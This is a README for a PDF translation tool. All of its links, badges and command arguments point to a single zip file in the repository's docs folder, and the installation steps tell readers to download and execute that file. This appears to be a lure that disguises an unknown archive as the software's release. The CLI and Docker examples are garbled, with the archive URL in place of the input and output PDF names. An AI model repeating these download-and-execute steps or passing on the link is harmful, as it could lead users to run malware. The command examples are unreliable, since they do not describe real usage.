# PDFMathTranslate 📄🔄

![PDFMathTranslate](https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip) ![GitHub Releases](https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip)

Welcome to **PDFMathTranslate**! This repository focuses on translating scientific papers in PDF format while preserving their original layout. With the help of advanced AI technologies, our tool supports multiple languages, including English, Chinese, Japanese, Korean, and Russian. It integrates with various translation services like Google, DeepL, Ollama, and OpenAI. You can access the latest releases [here](https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip).

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Supported Languages](#supported-languages)
- [Integration with Translation Services](#integration-with-translation-services)
- [CLI and GUI Options](#cli-and-gui-options)
- [Docker Setup](#docker-setup)
- [Zotero Integration](#zotero-integration)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

## Features

- **Preserved Formatting**: Translates PDFs while maintaining the original layout.
- **Multi-language Support**: Translates between English, Chinese, Japanese, Korean, and Russian.
- **AI-Powered**: Utilizes state-of-the-art AI for accurate translations.
- **Multiple Interfaces**: Available as a CLI, GUI, MCP, and Docker application.
- **Zotero Compatibility**: Easily integrates with Zotero for reference management.

## Installation

To get started with PDFMathTranslate, download the latest release from the [Releases section](https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip). You will find a downloadable file there. Execute the file to install the application on your system.

### Requirements

- Python 3.6 or higher
- Pip (Python package installer)
- Docker (if using Docker setup)

### Steps

1. Download the latest release from the [Releases section](https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip).
2. Execute the downloaded file to install the application.
3. Follow the prompts to complete the installation.

## Usage

Once installed, you can use PDFMathTranslate to translate your PDF documents. The command-line interface allows you to run translations directly from your terminal. 

### Basic Command

```bash
pdfmathtranslate translate <https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip> <https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip>
```

This command will take `https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip`, translate it, and save the output as `https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip`.

### GUI Usage

If you prefer a graphical interface, launch the GUI application and follow these steps:

1. Select the PDF file you wish to translate.
2. Choose the target language.
3. Click the "Translate" button.

The translated PDF will be saved in the same directory as the original.

## Supported Languages

PDFMathTranslate supports the following languages:

- English
- Chinese
- Japanese
- Korean
- Russian

This multilingual support makes it an excellent tool for researchers and students worldwide.

## Integration with Translation Services

PDFMathTranslate works with several translation services to provide the best results. You can configure your preferred service in the settings:

- **Google Translate**
- **DeepL**
- **Ollama**
- **OpenAI**

### Configuring Translation Services

To set up your preferred translation service, modify the configuration file:

1. Locate the configuration file in the installation directory.
2. Edit the `translation_service` field to your desired service.
3. Save the changes.

## CLI and GUI Options

### Command-Line Interface (CLI)

The CLI provides various commands for users who prefer working in a terminal. Here are some common commands:

- **Translate a PDF**: 
  ```bash
  pdfmathtranslate translate <https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip> <https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip>
  ```

- **List Available Languages**:
  ```bash
  pdfmathtranslate languages
  ```

### Graphical User Interface (GUI)

The GUI is user-friendly and designed for those who prefer visual interaction. It features:

- Easy file selection
- Language dropdown
- Progress indicators

## Docker Setup

If you prefer using Docker, PDFMathTranslate is available as a Docker image. Follow these steps to set it up:

1. Ensure Docker is installed on your machine.
2. Pull the Docker image:
   ```bash
   docker pull bapikumarb1/pdfmathtranslate
   ```
3. Run the Docker container:
   ```bash
   docker run -v $(pwd):/data bapikumarb1/pdfmathtranslate translate https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip
   ```

This command will mount your current directory and translate the specified PDF file.

## Zotero Integration

PDFMathTranslate seamlessly integrates with Zotero, allowing you to manage references easily. To use this feature:

1. Install the Zotero plugin.
2. Configure PDFMathTranslate to connect with your Zotero library.
3. Import and export references directly from the application.

## Contributing

We welcome contributions from the community. If you want to contribute, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Submit a pull request with a clear description of your changes.

## License

PDFMathTranslate is licensed under the MIT License. See the LICENSE file for more details.

## Contact

For any questions or feedback, please reach out via the Issues section of this repository or contact the maintainers directly.

---

Feel free to explore and use PDFMathTranslate for all your PDF translation needs. Don't forget to check the [Releases section](https://raw.githubusercontent.com/bapikumarb1/PDFMathTranslate/main/docs/Translate-PDF-Math-pyrrhichius.zip) for the latest updates and improvements!